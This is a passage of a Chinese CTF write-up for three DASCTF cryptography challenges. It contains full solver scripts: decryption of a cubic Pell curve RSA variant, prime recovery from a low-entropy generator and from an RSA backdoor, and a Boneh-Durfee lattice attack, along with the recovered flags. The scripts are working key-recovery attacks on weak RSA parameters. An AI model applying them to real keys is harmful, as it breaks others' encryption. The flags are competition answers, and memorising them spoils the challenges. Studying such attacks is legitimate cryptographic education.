> 1，计算出第一步和第二步中的、模$ p^r $和$ q^s $下的方程里的两组根：$ (a_{p,1},a_{p,2}) $和$ (a_{q,1},a_{q,2}) $（计算参考论文里的Corollary 3）。
>
>  
>
> 2，然后结合CRT与第三步中所列出来的同余关系，计算出$ a_1、a_2、a_3、a_4 $。
>
>  
>
> 3，计算$ D=(d_1,d_2,d_3,d_4) $，当$ a_i $符合某一个$ d_i $的条件时，则后面进行椭圆曲线数乘的时候使用这个$ d $，其中$ R^3(p) $指：在$ Z/pZ $下$ p $的立方剩余空间（这里直接理解成立方剩余就行）。$ (d_1,d_2,d_3,d_4) $的计算公式如下：
>
>  
>
> ![image-1730940450391](./assets/image-1730940450391.png)
>
>  
>
> 4，遍历$ D=(d_1,d_2,d_3,d_4) $，并根据第六步的$ M_i=(x_i,y_i,z_i)=d_i⊙(x_C,y_C,z_C) $以及$ a_i $所对应的Cubic Pell Curve，计算出对应的$ M_i $；当我们算出$ M=(x_i,y_i,0) $时，我们便恢复出明文$ M $了。
>



该解密系统对应的代码：



```python
# https://eprint.iacr.org/2024/385.pdf

import gmpy2
from Crypto.Util.number import *
from sympy.ntheory.modular import crt


def Legendre(n, p):
    return pow(n, (p - 1) // 2, p)


def Tonelli_Shanks(n, p):
    assert Legendre(n, p) == 1
    if p % 4 == 3:
        return pow(n, (p + 1) // 4, p)
    q = p - 1
    s = 0
    while q % 2 == 0:
        q //= 2
        s += 1
    z = next(z for z in range(2, p) if Legendre(z, p) == p - 1)
    c = pow(z, q, p)
    r = pow(n, (q + 1) // 2, p)
    t = pow(n, q, p)
    m = s
    if t % p == 1:
        return r
    else:
        i = 0
        while t % p != 1:
            temp = pow(t, 2 ** (i + 1), p)
            i += 1
            if temp % p == 1:
                b = pow(c, 2 ** (m - i - 1), p)
                r = r * b % p
                c = b * b % p
                t = t * c % p
                m = i
                i = 0
        return r


class Pell_Curve:
    def __init__(self, a, N):
        self.a = a
        self.N = N

    def is_on_curve(self, point):
        if point is None:
            return True
        x, y, z = point
        return (
            x**3 + self.a * y**3 + self.a**2 * z**3 - 3 * self.a * x * y * z
        ) % self.N == 1

    def add(self, P, Q):
        x1, y1, z1 = P
        x2, y2, z2 = Q
        x3 = (x1 * x2 + self.a * (y2 * z1 + y1 * z2)) % self.N
        y3 = (x2 * y1 + x1 * y2 + self.a * z1 * z2) % self.N
        z3 = (y1 * y2 + x2 * z1 + x1 * z2) % self.N
        return (x3, y3, z3)

    def mul(self, P, x):
        Q = (1, 0, 0)
        while x > 0:
            if x & 1:
                Q = self.add(Q, P)
            P = self.add(P, P)
            x >>= 1
        return Q


def psi(p, q, r, s):
    psi1 = p ** (2 * (r - 1)) * q ** (2 * (s - 1)) * (p**2 + p + 1) * (q**2 + q + 1)
    psi2 = p ** (2 * (r - 1)) * q ** (2 * (s - 1)) * (p - 1) ** 2 * (q - 1) ** 2
    psi3 = p ** (2 * (r - 1)) * q ** (2 * (s - 1)) * (p**2 + p + 1) * (q - 1) ** 2
    psi4 = p ** (2 * (r - 1)) * q ** (2 * (s - 1)) * (p - 1) ** 2 * (q**2 + q + 1)
    return (psi1, psi2, psi3, psi4)


def gen(E, Q, r, s):
    lcg = LCG(E, Q)
    while 1:
        p = lcg.get_prime()
        q = lcg.get_prime()
        if p % 3 == 1 and q % 3 == 1:
            N = p**r * q**s
            e = 0x20002
            return (N, e)


def cubic_residue(a, p):
    return pow(a, (p - 1) // gmpy2.gcd(3, p - 1), p) == 1


def judge_d(a, p, q, d):
    cr_p = cubic_residue(a, p)
    cr_q = cubic_residue(a, q)
    if cr_p and cr_q:
        return d[1]
    elif not cr_p and not cr_q:
        return d[0]
    elif not cr_p and cr_q:
        return d[2]
    else:  # cr_p and not cr_q
        return d[3]

# Corollary 3
def roots(C, p, n):
    xc, yc, zc = C
    a = zc**3
    b = yc**3 - 3 * xc * yc * zc
    c = xc**3 - 1
    delta = (b**2 - 4 * a * c) % p
    _delta = Tonelli_Shanks(delta, p)
    y = (-b + _delta) * gmpy2.invert(2 * a, p) % p
    z = (-b - _delta) * gmpy2.invert(2 * a, p) % p
    for i in range(1, n):
        y = y - (a * y**2 + b * y + c) * gmpy2.invert(
            int(2 * a * y + b), p ** (i + 1)
        ) % p ** (i + 1)
        z = z - (a * z**2 + b * z + c) * gmpy2.invert(
            int(2 * a * z + b), p ** (i + 1)
        ) % p ** (i + 1)
    return (y, z)

def decrypt(C, p, q, d, r, s):
    aps = roots(C, p, r)
    aqs = roots(C, q, s)
    N = p**r * q**s
    A = []
    for i in aps:
        for j in aqs:
            a = crt([p**r, q**s], [int(i), int(j)])[0]
            A.append(a)
    for i in range(len(A)):
        curve = Pell_Curve(A[i], N)
        M = curve.mul(C, judge_d(A[i], p, q, d))
        if M[2] == 0:
            return (int(M[0]), int(M[1]))
    return None


ps = psi(p, q, r, s)
d = []
for i in ps:
    d.append(inverse(e, i))
print(long_to_bytes(decrypt(C, p, q, d, r, s)[0]))
```



但代入计算会发现：计算不出来$ d $



回去看加密代码会发现：$ e=0x20002 $，这样的话会有：



$ \gcd(e,pq(p^2 + p + 1)(q^2 + q + 1)(p - 1)(q - 1))=2
 $



于是我们需要换个方法去转化一下。



这里记$ C $为密文，$ M $为原文，$ 0x10001 $为$ l $，那么



$ C=2lM
 $



虽然我们无法直接计算出$ M $，但是我们可以知道：



$ \gcd(e/2,pq(p^2 + p + 1)(q^2 + q + 1)(p - 1)(q - 1))=1
 $



所以我们可以先通过解密系统计算出$ 2M $，然后再恢复$ M $



而我们去推一下$ 2M $，可以发现：



$ 2M=(x^2,2xy,y^2)
 $



那么只要对解密完得到的$ M_x $开二次方根即可 (我这里用了论文里的Corollary 3)



完整exp:



```python
import tqdm
import gmpy2
from Crypto.Util.number import *
from sympy.ntheory.modular import crt

n = 142509889408494696639682201799643202268988370577642546783876593347546850250051841172274152716714403313311584670791108601588046986700175746446804470329761265314268119548997548026516318449862727871202339967955587242463610862701184493904376304507029176806166448249192854001854607465457042204258734279909961546441004233711967226919624405968584449147177981949821415107225952390645278348482729250785152039807053641247569456385545220501027102363800108028762768824577077321340577271010321469215228402821463907345773901277193445125640936231772522681574300491883451795804527966948605710874090658775247402867915876744113646170885038891240778364069379164812880482584571673151293322613478565661348746336931021896668941228934951050789999827329748371987279847108342825214485163497943
N = 9909641861967580472493256614158113105414778684219844785944662774988084232380069009372420371597872375863508561123648164278317871844235719752735021659264009
Q =  (5725664012637594848838084306454804843458550077896287815106012266176452953193402684379119042639063659980463425502946083139850146060755640351348257807890845,7995259612407104192119579242200802136801092493271952329412936709212369500868134058817979488983954214781719018555338511778896087250394604977285067013758829)

R.<x> = Zmod(N)[]
f1 = x ^ 2 - Q[0]
f2 = x ^ 3 - Q[1]
for i in f1.roots():
    for j in f2.roots():
        if i[0] == j[0]:
            t = i[0]

R.<x> = Zmod(N)[]
for i in tqdm.tqdm(range(1, 1000)):
    xi = x * inverse(i, N)
    pp = ((t ^ 3 - x ^ 3) ^ 2 - (t ^ 2 + x ^ 2) * (t ^ 2 - x ^ 2) ^ 2)^3
    qq = ((t ^ 3 - xi ^ 3) ^ 2 - (t ^ 2 + xi ^ 2) * (t ^ 2 - xi ^ 2) ^ 2)^2
    f = n * (t ^ 2 - x ^ 2) ^ 6 * (t ^ 2 - xi ^ 2) ^ 4 - pp * qq
    roots = f.roots()
    if roots:
        for xx in roots:
            x1 = xx[0]
            if t != x1:
                p1 = (t ^ 3 - x1 ^ 3) ^ 2 * inverse(int(t ^ 2 - x1 ^ 2), N) ^ 2 - t ^ 2 - x1 ^ 2
                if n % int(p1) == 0:
                    p = int(p1)
                    print(p)
                    break
        if n % int(p1) == 0:
            break


        
r = 3
s = 2
q = int(gmpy2.iroot(n//p^3,2)[0])

def Legendre(n, p):
    return pow(n, (p - 1) // 2, p)


def Tonelli_Shanks(n, p):
    assert Legendre(n, p) == 1
    if p % 4 == 3:
        return pow(n, (p + 1) // 4, p)
    q = p - 1
    s = 0
    while q % 2 == 0:
        q //= 2
        s += 1
    z = next(z for z in range(2, p) if Legendre(z, p) == p - 1)
    c = pow(z, q, p)
    r = pow(n, (q + 1) // 2, p)
    t = pow(n, q, p)
    m = s
    if t % p == 1:
        return r
    else:
        i = 0
        while t % p != 1:
            temp = pow(t, 2 ** (i + 1), p)
            i += 1
            if temp % p == 1:
                b = pow(c, 2 ** (m - i - 1), p)
                r = r * b % p
                c = b * b % p
                t = t * c % p
                m = i
                i = 0
        return r


class Pell_Curve:
    def __init__(self, a, N):
        self.a = a
        self.N = N

    def is_on_curve(self, point):
        if point is None:
            return True
        x, y, z = point
        return (
            x**3 + self.a * y**3 + self.a**2 * z**3 - 3 * self.a * x * y * z
        ) % self.N == 1

    def add(self, P, Q):
        x1, y1, z1 = P
        x2, y2, z2 = Q
        x3 = (x1 * x2 + self.a * (y2 * z1 + y1 * z2)) % self.N
        y3 = (x2 * y1 + x1 * y2 + self.a * z1 * z2) % self.N
        z3 = (y1 * y2 + x2 * z1 + x1 * z2) % self.N
        return (x3, y3, z3)

    def mul(self, P, x):
        Q = (1, 0, 0)
        while x > 0:
            if x & 1:
                Q = self.add(Q, P)
            P = self.add(P, P)
            x >>= 1
        return Q


def psi(p, q, r, s):
    psi1 = p ** (2 * (r - 1)) * q ** (2 * (s - 1)) * (p**2 + p + 1) * (q**2 + q + 1)
    psi2 = p ** (2 * (r - 1)) * q ** (2 * (s - 1)) * (p - 1) ** 2 * (q - 1) ** 2
    psi3 = p ** (2 * (r - 1)) * q ** (2 * (s - 1)) * (p**2 + p + 1) * (q - 1) ** 2
    psi4 = p ** (2 * (r - 1)) * q ** (2 * (s - 1)) * (p - 1) ** 2 * (q**2 + q + 1)
    return (psi1, psi2, psi3, psi4)

def cubic_residue(a, p):
    return pow(a, (p - 1) // gmpy2.gcd(3, p - 1), p) == 1


def judge_d(a, p, q, d):
    cr_p = cubic_residue(a, p)
    cr_q = cubic_residue(a, q)
    if cr_p and cr_q:
        return d[1]
    elif not cr_p and not cr_q:
        return d[0]
    elif not cr_p and cr_q:
        return d[2]
    else:  # cr_p and not cr_q
        return d[3]

# Corollary 3
def roots(C, p, n):
    xc, yc, zc = C
    a = zc**3
    b = yc**3 - 3 * xc * yc * zc
    c = xc**3 - 1
    delta = (b**2 - 4 * a * c) % p
    _delta = Tonelli_Shanks(delta, p)
    y = (-b + _delta) * inverse(2 * a, p) % p
    z = (-b - _delta) * inverse(2 * a, p) % p
    for i in range(1, n):
        y = y - (a * y**2 + b * y + c) * inverse(
            int(2 * a * y + b), p ** (i + 1)
        ) % p ** (i + 1)
        z = z - (a * z**2 + b * z + c) * inverse(
            int(2 * a * z + b), p ** (i + 1)
        ) % p ** (i + 1)
    return (y, z)

C = (81768339111299816705544898152771220210336305743364535623542396932097508874478708007356482559951843443716017684599109593939309497876283954739065532068358640123897297735011312421303760220341679952682608376253590454613919282861879034834442483766217227383792409215337347571227544874051744198403805434968528386779039795337990338248171933970791615195263892724675263032559658819135855374073644306381889879990890042223246077362618291952646985683966244920555989982399613765530011499719074486903003792714562373937144871278164758310693947837335237349195046040995477558132367388842506474592468217861986173383953237474756202802360230890862369060851962186244111055545256271117424905591906972255761770741149563674457745615873496579818814035900990579591845004609499494547080458704584, 84621087300399647293777247835306246465300232341486881635357679809773437325943820311329988605594440622251629971586435278844599108015288735134349648420317858374374591896130432582322507215780484530408523427525797210077752785624079848616300884164345285833494971279538396297733797260240933961493604434803064166573528094704954546014575856837921125063112845773099272164228859908533081610458091806418565502108153124283531626701488036466436102247845200341492584130445948027051529476352653110990934770121255651400555911301783360692285788890607740888376040139286200434818197323063848144168033132174931153362170954175707409126745301216651916596489805505649061280397491087997636237767764403484186207472581036806824115157283392062188592165421921369151939109986184806890233258458794, 107470405748787057257826187107093535161311781207158281438762592876162686482566135109505652982571025667746244660986635749326688338471024529029121466041296205925603803529179856346298760611767192411134153152234712303426575150170977692186997733960581208607060982624871524319162170866870037830416559938924612968969966225954744925337757413696488884826990851697771972617146921133799053964257776476473920346656878321177511107743545375181606366722878715116467369115483252574781605976088763248469134730611983687505906661228606502293949130180171550100994569942435781067167383369188511834406179774120708650048333802855942156250759495072298696263590518886055347952253836780124031369144821306654247715239306949355039924862372681097653701186683219165141054051943634109692683916632353)
e = 0x20002

ps = psi(p, q, r, s)
d = []
for i in ps:
    d.append(inverse(e // 2, i))
aps = roots(C, p, r)
aqs = roots(C, q, s)
A = []
for i in aps:
    for j in aqs:
        a = crt([p**r, q**s], [int(i), int(j)])[0]
        A.append(a)

# 根据Corollary 3改改就能算平方根
def roots2(M1, p, n):
	a = 1
	b = 0
	c = -M1
	delta = (b**2 - 4 * a * c) % p
	_delta = Tonelli_Shanks(delta, p)
	y = (-b + _delta) * inverse(2 * a, p) % p
	z = (-b - _delta) * inverse(2 * a, p) % p
	for i in range(1, n):
		y = y - (a * y**2 + b * y + c) * inverse(int(2 * a * y + b), p ** (i + 1)) % p ** (i + 1)
		z = z - (a * z**2 + b * z + c) * inverse(int(2 * a * z + b), p ** (i + 1)) % p ** (i + 1)
	return (y, z)

for a in A:
    curve = Pell_Curve(a, n)
    M1 = curve.mul(C, judge_d(a, p, q, d))
    x, y, z = M1
    x1 = roots2(x, p, r)
    x2 = roots2(x, q, s)
    for i in x1:
        for j in x2:
            m=long_to_bytes(crt([p**r, q**s], [int(i), int(j)])[0])
            if m.startswith(b'DASCTF'):
                print(m)
                exit(0)
# DASCTF{3dc7844aafe4e0628ba29ef09501089dd4a2adeec924b916be275cfc3953d681}______This_is_pad:adwd3i2j0fj20ef2j0fj20efj9h2j0fj20efj9h2j0fj2asdaedfqe0efj9h2j0fj20efj9qfqdqwdh2j0fj2qfefwfewfqwedfqwdqwdqw0efj9h2j0fj20efj9h2j0fj20efjwfewfwefwefwe9hj9huiehv89h92j0fj20efj9h8hwd893y198e32
```

## 题目：EZ_RSA解题步骤


题目需要我们算 $ p1 + p2 + q1 + q2 $ 的和的md5值，所以我们需要算出这四个素数才行。



于是这里分成两部分去计算：

**gen1**

****

在加密代码里，出题人直接把这函数写成一行，这人真的坏（手动滑稽）



所以我们需要把这个gen1转成正常的加密代码才好做题：



```python
rand = lambda n: bytes(random.getrandbits(1) for _ in range(n))

def gen1(bits):
    p = getPrime(bits // 2, randfunc=rand)
    q = getPrime(bits // 2, randfunc=rand)
    return p, q
```



因为x使用的是 **getrandbits(1)**；因此，x里只有**b'\x00'**和**b'\x01'**这两种可能的bytes。



而且如果自己尝试用gen1生成素数会发现：**对应的bytes类型值里都是b"\x80"，且除去开头后的长度都是63。**



故我们可以通过剪枝的方法去爆破出$ p_1 $、$ q_1 $：



```python
from Crypto.Util.number import bytes_to_long


def findflag(p, q, n):
    if len(p) == 63:
        pp = bytes_to_long(b"\x80" + p)
        if n % pp == 0:
            print(pp)
    else:
        L = len(p)
        pp = bytes_to_long(p)
        qq = bytes_to_long(q)
        if pp * qq % (256**L) == n % (256**L):
            findflag(b"\x00" + p, b"\x01" + q, n)
            findflag(b"\x01" + p, b"\x01" + q, n)
            findflag(b"\x00" + p, b"\x00" + q, n)
            findflag(b"\x01" + p, b"\x00" + q, n)


n1 = 44945076854246685060397710825960160082061127479194994041436997195972585701097443198954359213635892234058786065342178389181538153413878118039445271277476379366294977408981257175008890470376094381644530106799352839565803317977637572325347776636285703517680754624094985374606187797141657688145287340444623176193
# 因为n1的最后一位是3，所以p和q的bytes里的最后一位都是b"\x01"
findflag(b"\x01", b"\x01", n1)
print("over")
# 6704108555018235126044943757232820606509394092422982568570889193755927961059256373509251540968761510597955349467469602569838971815245810437719445704016129
# 6704109351064115455893295955648034742490075153469647652626278891915863408109665863057399099944508436950445216168956861863970048266975514429634433698038017
```



**gen2**

这个其实是RSA的一个后门：[A new idea for RSA backdoors (arxiv.org)](https://arxiv.org/pdf/2201.13153)，对应的解法如下：

**获得所有可能的 (q2 mod T, p2 mod T)**

还是一样，先将gen2转成正常的加密代码：



```python
def gen2(alpha=512, K=500, T=getPrime(506)):
    while True:
        q = getPrime(alpha)
        r = getPrime(alpha)
        for k in range(2, K+1):
            p = r + (k * q - r) % T
            if isPrime(p):
                return p, q, T
```



现在我们便可以看出：



$ p_2\equiv kq_2~mod~T
 $



于是代入到 $ n_2 $ 中便有：



$ n_2\equiv kq_2^2~mod~T
 $



因为 $ k\in[2,K] $ 且 $ K $ 很小，那么我们可以遍历 $ k $ 的值，



得到所有可能的 $ (q_2~mod~T,~p_2~mod~T) $，然后通过下面的过程，我们来恢复 $ p_2,~q_2 $



**恢复 p2, q2**



通过gen2以及上述得到的式子，我们可以把 $ n_2 $ 写成：



$ n_2=[\pi T+(p_2~mod~T)][vT+(q_2~mod~T)]~~~~~①
 $



如果我们记：$ \delta=[n_2-(p_2~mod~T)(q_2~mod~T)]/T $



那么我们展开便有：



$ \delta=\pi vT+\pi(q~mod~T)+v(p~mod~T)
 $



然后我们记：$ x=\pi,~C=\pi+v,~a=q~mod~T,~b=p~mod~T $，



那么我们可以得到：



$ \delta=x(C-x)T+ax+b(C-x)
 $



我们计算一下 $ C $ 的上界，会发现：我们是能穷举 $ C $ 的



> **我们把①式张开得到**
>
>  
>
> $ n_2=\pi vT^2+vT(p_2~mod~T)+\pi T(q_2~mod~T)+(p_2q_2~mod~T)
 $
>
>  
>
> **那么明显**$ ~C=\pi+v\le\pi v\le n_2/T^2 $
>
>  
>
> **通过计算（或者直接拿sage去算 **$ n_2/T^2 $**）可以知道：**$ n_2/T^2<2^{15}~(small~num) $**，可以看出 **$ C $** 值确实很小**
>



于是我们就可以穷举 $ C $ ，用下面这个方法来计算 $ x $（即$ \pi $），进而得到 $ v $：



![image-1730940450932](./assets/image-1730940450932.png)



简单来说，就是两步：



> 1，遍历去找可能的C，使得$ \Delta $这个判别式不小于0
>
>  
>
> 2，然后尝试求我们这个二次方程的两个解：$ D=(CT+a-b\pm\sqrt{\Delta})/2T $
>
>  
>
> 3，然后判断$ D $是否为整数；如果有一个解$ D_i $成立，则$ \pi=D_i,~v=C-\pi $
>



然后再通过下式便可算出 $ p_2,~q_2 $ ：



$ p_2=\pi T+b\\q_2=vT+a
 $



由于我们有了 $ a=q_2~mod~T,~b=p_2~mod~T $ 的所有可能值，故我们可以通过遍历 $ (a,~b) $ 进行上述操作，恢复出 $ p_2,~q_2 $



对应的exp:



```python
import gmpy2
from Crypto.Util.number import *

def Legendre(n, p):
    return pow(n, (p - 1) // 2, p)


def Tonelli_Shanks(n, p):
    assert Legendre(n, p) == 1
    if p % 4 == 3:
        return pow(n, (p + 1) // 4, p)
    q = p - 1
    s = 0
    while q % 2 == 0:
        q = q // 2
        s += 1
    for z in range(2, p):
        if Legendre(z, p) == p - 1:
            c = pow(z, q, p)
            break
    r = pow(n, (q + 1) // 2, p)
    t = pow(n, q, p)
    m = s
    if t % p == 1:
        return r
    else:
        i = 0
        while t % p != 1:
            temp = pow(t, 2 ** (i + 1), p)
            i += 1
            if temp % p == 1:
                b = pow(c, 2 ** (m - i - 1), p)
                r = r * b % p
                c = b * b % p
                t = t * c % p
                m = i
                i = 0
        return r

K=500
n = 57784854392324291351358704449756491526369373648574288191576366413179694041729248864428194536249209588548791706980878177790271653262097539281383559433402738548851606776347237650302071287124974607439996041713554182180186588308614458904981542909792071322939678815174962366963098166320441995961513884899917498099
T = 150514823288951667574011681197229106951781617714873679347685702558528178681176081082658953342482323349796111911103531429615442550000291753989779754337491

nt = n % T
gammas = []
for k in range(2, K + 1):
    k_ = inverse(k, T)
    if Legendre(nt * k_, T) == 1:
        gammas.append(nt * k_ % T)
pqs = []
for gamma in gammas:
    qt1 = Tonelli_Shanks(gamma, T)
    assert qt1**2 % T == gamma and qt1 < T
    qt2 = T - qt1
    assert qt2**2 % T == gamma
    pt1 = nt * inverse(qt1, T) % T
    pt2 = nt * inverse(qt2, T) % T
    pqs.append((qt1, pt1))
    pqs.append((qt2, pt2))
for a, b in pqs:
    begin = gmpy2.iroot(2 * (n // T**2) - 1, 2)[0]
    end = n // (T**2)
    delta = (n - a * b) // T
    for C in range(begin, end + 1):
        Delta = (b - a - C * T) ** 2 - 4 * T * (delta - b * C)
        if Delta < 0:
            continue
        xx = gmpy2.iroot(Delta, 2)
        if xx[1]:
            x1 = C * T + a - b + xx[0]
            x2 = C * T + a - b - xx[0]
            for x in (x1, x2):
                if x % (2 * T) == 0:
                    x = x // (2 * T)
                    pi = x
                    v = C - x
                    p1 = pi * T + b
                    q1 = v * T + a
                    if p1 * q1 == n:
                        print(p1, q1)
                        exit(0)
# 8604143985568971357221106163518321547782942525630490158067993880524661927741225574307260111628133976467492901704516592869940382055272648214920231756723373 
# 6715932984064668444342570644774156271984002289395510283696469320418962556390690901906940107908954287013902962625382543926197508086756331581472941654687263
```



**last**



最后计算flag即可：



```python
import hashlib

p1 = 6704108555018235126044943757232820606509394092422982568570889193755927961059256373509251540968761510597955349467469602569838971815245810437719445704016129
q1 = 6704109351064115455893295955648034742490075153469647652626278891915863408109665863057399099944508436950445216168956861863970048266975514429634433698038017
p2 = 8604143985568971357221106163518321547782942525630490158067993880524661927741225574307260111628133976467492901704516592869940382055272648214920231756723373
q2 = 6715932984064668444342570644774156271984002289395510283696469320418962556390690901906940107908954287013902962625382543926197508086756331581472941654687263
flag = "DASCTF{" + hashlib.md5(str(p1 + p2 + q1 + q2).encode()).hexdigest() + "}"
print(flag)
# DASCTF{354ed97c5a3d9d16f49ad93fc30e1c6f}
```

## 题目：CF解题步骤
解题步骤

**Boneh and Durfee**



对于相对较大的$ e $，并且$ e<n^{0.292} $，我们可以利用Boneh and Durfee Attack来分解因子



首先我们可以知道：$ e\times d≡1\mod\phi(n) $



于是可以转化一下，得到$ e\times d  = 1 + k\times\phi(n)$



即$ k\times\phi(N)+1≡0\mod e~——~(1) $



又因为$ \phi(n)=(p-1)(q-1)(r-1)(s-1)=n-t+1 $，其中$ t $为一个包含$ p,q,r,s $的多项式



故我们代入到式$ (1) $中，得到$ k(n-t+1)+1≡0\mod e $



然后我们记：$ A=(N+1) $，则上式可以写成：



$ f(x,y)=x(A-y)+1≡0\mod e
 $



假如我们可以解出这个方程的根，我们便可得到$ \phi(n) $



**多元n与phi分解因子**



多元n、phi分解因子这步，需要用到这篇论文：https://link.springer.com/content/pdf/10.1007/3-540-36492-7_25.pdf；具体位置在 “Equivalence of Factoring and Exposing the Private Key” 这节。



参考其中的方法，使用$ n $和$ \phi(n) $来分解出因子即可。



EXP：



```python
from Crypto.Util.number import *
from Crypto.Cipher import AES
import hashlib
from __future__ import print_function


############################################
# Config
##########################################

"""
Setting debug to true will display more informations
about the lattice, the bounds, the vectors...
"""
debug = True

"""
Setting strict to true will stop the algorithm (and
return (-1, -1)) if we don't have a correct
upperbound on the determinant. Note that this
doesn't necesseraly mean that no solutions
will be found since the theoretical upperbound is
usualy far away from actual results. That is why
you should probably use `strict = False`
"""
strict = False

"""
This is experimental, but has provided remarkable results
so far. It tries to reduce the lattice as much as it can
while keeping its efficiency. I see no reason not to use
this option, but if things don't work, you should try
disabling it
"""
helpful_only = True
dimension_min = 7 # stop removing if lattice reaches that dimension

############################################
# Functions
##########################################

# display stats on helpful vectors
def helpful_vectors(BB, modulus):
    nothelpful = 0
    for ii in range(BB.dimensions()[0]):
        if BB[ii,ii] >= modulus:
            nothelpful += 1

    print(nothelpful, "/", BB.dimensions()[0], " vectors are not helpful")

# display matrix picture with 0 and X
def matrix_overview(BB, bound):
    for ii in range(BB.dimensions()[0]):
        a = ('%02d ' % ii)
        for jj in range(BB.dimensions()[1]):
            a += '0' if BB[ii,jj] == 0 else 'X'
            if BB.dimensions()[0] < 60:
                a += ' '
        if BB[ii, ii] >= bound:
            a += '~'
        print(a)

# tries to remove unhelpful vectors
# we start at current = n-1 (last vector)
def remove_unhelpful(BB, monomials, bound, current):
    # end of our recursive function
    if current == -1 or BB.dimensions()[0] <= dimension_min:
        return BB

    # we start by checking from the end
    for ii in range(current, -1, -1):
        # if it is unhelpful:
        if BB[ii, ii] >= bound:
            affected_vectors = 0
            affected_vector_index = 0
            # let's check if it affects other vectors
            for jj in range(ii + 1, BB.dimensions()[0]):
                # if another vector is affected:
                # we increase the count
                if BB[jj, ii] != 0:
                    affected_vectors += 1
                    affected_vector_index = jj

            # level:0
            # if no other vectors end up affected
            # we remove it
            if affected_vectors == 0:
                print("* removing unhelpful vector", ii)
                BB = BB.delete_columns([ii])
                BB = BB.delete_rows([ii])
                monomials.pop(ii)
                BB = remove_unhelpful(BB, monomials, bound, ii-1)
                return BB

            # level:1
            # if just one was affected we check
            # if it is affecting someone else
            elif affected_vectors == 1:
                affected_deeper = True
                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):
                    # if it is affecting even one vector
                    # we give up on this one
                    if BB[kk, affected_vector_index] != 0:
                        affected_deeper = False
                # remove both it if no other vector was affected and
                # this helpful vector is not helpful enough
                # compared to our unhelpful one
                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) < abs(bound - BB[ii, ii]):
                    print("* removing unhelpful vectors", ii, "and", affected_vector_index)
                    BB = BB.delete_columns([affected_vector_index, ii])
                    BB = BB.delete_rows([affected_vector_index, ii])
                    monomials.pop(affected_vector_index)
                    monomials.pop(ii)
                    BB = remove_unhelpful(BB, monomials, bound, ii-1)
                    return BB
    # nothing happened
    return BB

""" 
Returns:
* 0,0   if it fails
* -1,-1 if `strict=true`, and determinant doesn't bound
* x0,y0 the solutions of `pol`
"""
def boneh_durfee(pol, modulus, mm, tt, XX, YY):
    """
    Boneh and Durfee revisited by Herrmann and May
    
    finds a solution if:
    * d < N^delta
    * |x| < e^delta
    * |y| < e^0.5
    whenever delta < 1 - sqrt(2)/2 ~ 0.292
    """

    # substitution (Herrman and May)
    PR.<u, x, y> = PolynomialRing(ZZ)
    Q = PR.quotient(x*y + 1 - u) # u = xy + 1
    polZ = Q(pol).lift()

    UU = XX*YY + 1

    # x-shifts
    gg = []
    for kk in range(mm + 1):
        for ii in range(mm - kk + 1):
            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk
            gg.append(xshift)
    gg.sort()

    # x-shifts list of monomials
    monomials = []
    for polynomial in gg:
        for monomial in polynomial.monomials():
            if monomial not in monomials:
                monomials.append(monomial)
    monomials.sort()
    
    # y-shifts (selected by Herrman and May)
    for jj in range(1, tt + 1):
        for kk in range(floor(mm/tt) * jj, mm + 1):
            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)
            yshift = Q(yshift).lift()
            gg.append(yshift) # substitution
    
    # y-shifts list of monomials
    for jj in range(1, tt + 1):
        for kk in range(floor(mm/tt) * jj, mm + 1):
            monomials.append(u^kk * y^jj)

    # construct lattice B
    nn = len(monomials)
    BB = Matrix(ZZ, nn)
    for ii in range(nn):
        BB[ii, 0] = gg[ii](0, 0, 0)
        for jj in range(1, ii + 1):
            if monomials[jj] in gg[ii].monomials():
                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)

    # Prototype to reduce the lattice
    if helpful_only:
        # automatically remove
        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1)
        # reset dimension
        nn = BB.dimensions()[0]
        if nn == 0:
            print("failure")
            return 0,0

    # check if vectors are helpful
    if debug:
        helpful_vectors(BB, modulus^mm)
    
    # check if determinant is correctly bounded
    det = BB.det()
    bound = modulus^(mm*nn)
    if det >= bound:
        print("We do not have det < bound. Solutions might not be found.")
        print("Try with highers m and t.")
        if debug:
            diff = (log(det) - log(bound)) / log(2)
            print("size det(L) - size e^(m*n) = ", floor(diff))
        if strict:
            return -1, -1
    else:
        print("det(L) < e^(m*n) (good! If a solution exists < N^delta, it will be found)")

    # display the lattice basis
    if debug:
        matrix_overview(BB, modulus^mm)

    # LLL
    if debug:
        print("optimizing basis of the lattice via LLL, this can take a long time")

    BB = BB.LLL()

    if debug:
        print("LLL is done!")

    # transform vector i & j -> polynomials 1 & 2
    if debug:
        print("looking for independent vectors in the lattice")
    found_polynomials = False
    
    for pol1_idx in range(nn - 1):
        for pol2_idx in range(pol1_idx + 1, nn):
            # for i and j, create the two polynomials
            PR.<w,z> = PolynomialRing(ZZ)
            pol1 = pol2 = 0
            for jj in range(nn):
                pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)
                pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)

            # resultant
            PR.<q> = PolynomialRing(ZZ)
            rr = pol1.resultant(pol2)

            # are these good polynomials?
            if rr.is_zero() or rr.monomials() == [1]:
                continue
            else:
                print("found them, using vectors", pol1_idx, "and", pol2_idx)
                found_polynomials = True
                break
        if found_polynomials:
            break

    if not found_polynomials:
        print("no independant vectors could be found. This should very rarely happen...")
        return 0, 0
    
    rr = rr(q, q)

    # solutions
    soly = rr.roots()

    if len(soly) == 0:
        print("Your prediction (delta) is too small")
        return 0, 0

    soly = soly[0][0]
    ss = pol1(q, soly)
    solx = ss.roots()[0][0]

    #
    return solx, soly

def factorize_multi_prime(N, phi):
    prime_factors = set()
    factors = [N]
    while len(factors) > 0:
        # Element to factorize.
        N = factors[0]

        w = randrange(2, N - 1)
        i = 1
        while phi % (2**i) == 0:
            sqrt_1 = pow(w, phi // (2**i), N)
            if sqrt_1 > 1 and sqrt_1 != N - 1:
                # We can remove the element to factorize now, because we have a factorization.
                factors = factors[1:]

                p = gcd(N, sqrt_1 + 1)
                q = N // p

                if is_prime(p):
                    prime_factors.add(p)
                elif p > 1:
                    factors.append(p)

                if is_prime(q):
                    prime_factors.add(q)
                elif q > 1:
                    factors.append(q)

                # Continue in the outer loop
                break

            i += 1

    return list(prime_factors)


